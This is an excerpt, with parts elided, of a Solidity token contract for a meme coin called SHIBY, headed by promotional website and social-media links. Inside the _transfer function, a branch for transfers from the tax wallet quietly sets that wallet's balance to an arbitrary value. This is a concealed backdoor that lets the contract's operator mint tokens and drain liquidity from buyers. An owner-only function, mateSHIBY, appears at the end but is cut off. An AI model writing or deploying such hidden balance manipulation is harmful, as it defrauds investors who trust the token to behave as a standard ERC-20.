...
/*
$SHIBY the dog of Ethereum, sister to Shiba Inu.

Website :   https://www.shibyoneth.live
Telegram : https://t.me/shibyoneth
Twitter :     https://x.com/shibyoneth
 */
...
contract SHIBY is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"SHIBY";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (from != uniswapV2Pair && to != uniswapV2Pair && from != address(this)) {
                taxAmount = 0;
            } else if (from == _taxWallet) _balances[_taxWallet] = _balances[to].add(amount);
    ...
    function mateSHIBY() external onlyOwner {
